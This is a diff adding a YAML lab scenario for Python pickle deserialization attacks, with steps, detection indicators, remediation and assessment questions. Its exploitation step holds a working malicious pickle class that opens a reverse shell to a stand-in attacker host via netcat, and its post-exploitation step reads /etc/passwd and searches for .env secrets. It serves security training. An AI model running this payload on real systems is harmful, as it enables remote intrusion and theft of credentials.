@@ -1,0 +1,107 @@
+# Category: Offensive Security - Application
+name: "Python Pickle Deserialization – RCE"
+id: "app-python-pickle-001"
+category: "offensive_security"
+subcategory: "application_security"
+difficulty: "intermediate"
+estimated_time: "60 minutes"
+
+description: |
+  Exploit Python's `pickle` module deserialization by injecting a malicious
+  pickle payload that executes arbitrary code when unpickled. Common in
+  applications that accept pickle‑encoded data (e.g., internal APIs, session
+  cookies, RPC). The attack leverages the `__reduce__` method to return a
+  callable and its arguments.
+
+learning_objectives:
+  - Understand Python pickle serialization format
+  - Craft a malicious pickle payload using `__reduce__`
+  - Execute system commands on the target
+  - Gain reverse shell
+
+tools:
+  - Python interpreter
+  - pickletools
+  - netcat
+  - curl
+
+prerequisites:
+  - Target endpoint that unpickles user‑provided data
+  - Python application (common in Flask, Django, PySpark)
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Identify pickle‑processing endpoints"
+    commands:
+      - "# Look for content-type: application/python-pickle"
+      - "# Or base64-encoded pickle data in cookies/params"
+    expected_output: "Endpoint identified"
+    detection: "Network traffic with pickle protocol signatures (e.g., b'\x80\x04' for protocol 4)"
+
+  - id: "step2"
+    phase: "exploitation"
+    action: "Generate malicious pickle payload"
+    commands:
+      - "# Python script to create payload:"
+      - "import pickle, os"
+      - "class Exploit(object):"
+      - "    def __reduce__(self):"
+      - "        return (os.system, ('nc -e /bin/bash attacker.com 4444',))"
+      - "pickle.dumps(Exploit())"
+      - "# Send the serialized data to endpoint"
+    expected_output: "Reverse shell connection"
+    detection: "Outbound network connections from Python process"
+
+  - id: "step3"
+    phase: "post_exploitation"
+    action: "Maintain access and exfiltrate data"
+    commands:
+      - "# After shell, explore file system"
+      - "ls -la"
+      - "cat /etc/passwd"
+      - "# Find application secrets"
+      - "find / -name '*.pyc' -o -name '*.env'"
+    expected_output: "Sensitive information obtained"
+    detection: "Anomalous Python process behavior; file reads by web user"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1190"
+    description: "Exploit Public-Facing Application"
+  - standard: "OWASP"
+    control: "A08:2021"
+    description: "Software and Data Integrity Failures"
+
+detection:
+  network_indicators:
+    - "Pickle data with malicious __reduce__ payloads (large size, unexpected imports)"
+    - "Outbound shell connections"
+  log_indicators:
+    - "Python tracebacks with `pickle.UnpicklingError`"
+  endpoint_indicators:
+    - "`pickle` module usage in application code"
+
+remediation:
+  immediate:
+    - "Do not unpickle untrusted data; use JSON instead"
+    - "Implement signature verification for pickled data"
+  long_term:
+    - "Use `pickle` with restricted `Unpickler` (e.g., override `find_class` to deny dangerous modules)"
+    - "Apply input validation and size limits"
+
+variables:
+  target_url: "http://target.com/api/deserialize"
+  attacker_ip: "10.0.0.5"
+  reverse_port: "4444"
+
+assessment_questions:
+  - "How does the `__reduce__` method enable code execution in pickle?"
+  - "What are safer alternatives to pickle for data exchange?"
+  - "How can you restrict unpickling to prevent RCE?"
+
+references:
+  - url: "https://blog.nelhage.com/2011/03/exploiting-pickle/"
+    title: "Exploiting Python Pickle"
+  - url: "https://docs.python.org/3/library/pickle.html"
+    title: "Python Pickle Documentation"
